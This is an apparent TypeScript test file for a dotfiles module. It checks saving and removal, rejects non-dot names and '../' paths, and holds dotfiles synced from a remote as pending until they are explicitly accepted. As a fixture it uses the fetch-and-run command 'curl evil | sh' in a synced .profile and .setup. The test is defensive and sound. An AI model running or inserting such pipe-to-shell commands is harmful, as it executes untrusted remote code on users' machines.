import assert from 'node:assert/strict';
import {test} from 'node:test';

// Home's storage as a browser keeps it: a map.
const shelf = new Map<string, string>();
Object.assign(globalThis, {localStorage: {
  getItem: (k: string) => shelf.get(k) ?? null, setItem: (k: string, v: string) => void shelf.set(k, v), removeItem: (k: string) => void shelf.delete(k),
}});
const dotfiles = await import('./dotfiles.ts');

test('saving keeps the others and is what the next Prompt starts with', async () => {
  await dotfiles.save('.profile', 'export A=1\n');
  await dotfiles.save('.gitconfig', '[user]\n');
  await dotfiles.save('.profile', 'export A=2\n');
  assert.deepEqual(dotfiles.read(), {'.gitconfig': '[user]\n', '.profile': 'export A=2\n'});
  assert.deepEqual(dotfiles.asFiles().map((f) => f.path).sort(), ['/root/.gitconfig', '/root/.profile']);
});

test('a name that is not a dotfile is refused and nothing is kept', async () => {
  const before = dotfiles.read();
  await assert.rejects(dotfiles.save('profile', 'x'), /begin with a dot/);
  await assert.rejects(dotfiles.save('../.profile', 'x'), /begin with a dot/);
  assert.deepEqual(dotfiles.read(), before);
});

test('removing takes only that one, and removing one not there changes nothing', async () => {
  await dotfiles.save('.inputrc', 'set bell-style none\n');
  await dotfiles.remove('.inputrc');
  assert.equal('.inputrc' in dotfiles.read(), false);
  assert.ok('.profile' in dotfiles.read());
  const before = dotfiles.read();
  await dotfiles.remove('.nothing');
  assert.deepEqual(dotfiles.read(), before);
});

test('one changed elsewhere runs nowhere here until it is taken; one written here runs at once', async () => {
  const {core} = await import('../app/host.ts');
  const {reloadState} = await import('./state.ts');
  await dotfiles.save('.profile', 'PS1="$ "\n');
  assert.deepEqual(dotfiles.waiting(), []);
  // Taken in from the Remote (as the core's sync writes it): changed, and one new.
  const kept = {...dotfiles.read(), '.profile': 'curl evil | sh\n', '.setup': 'curl evil | sh\n'};
  await core('state_set', {key: 'dotfiles', json: JSON.stringify(kept)});
  await reloadState(['dotfiles', 'trusted']);
  assert.deepEqual(dotfiles.waiting(), ['.profile', '.setup']);
  assert.equal(dotfiles.inEffect()['.profile'], 'PS1="$ "\n');
  assert.ok(!dotfiles.asFiles().some((f) => f.path === '/root/.setup'));
  // What this device runs is never set, only written or taken.
  await assert.rejects(core('state_set', {key: 'trusted', json: JSON.stringify(kept)}), /writing a dotfile or taking one/);
  await dotfiles.take(['.setup']);
  assert.deepEqual(dotfiles.waiting(), ['.profile']);
  await dotfiles.take();
  assert.deepEqual(dotfiles.waiting(), []);
  assert.equal(dotfiles.inEffect()['.profile'], 'curl evil | sh\n');
});
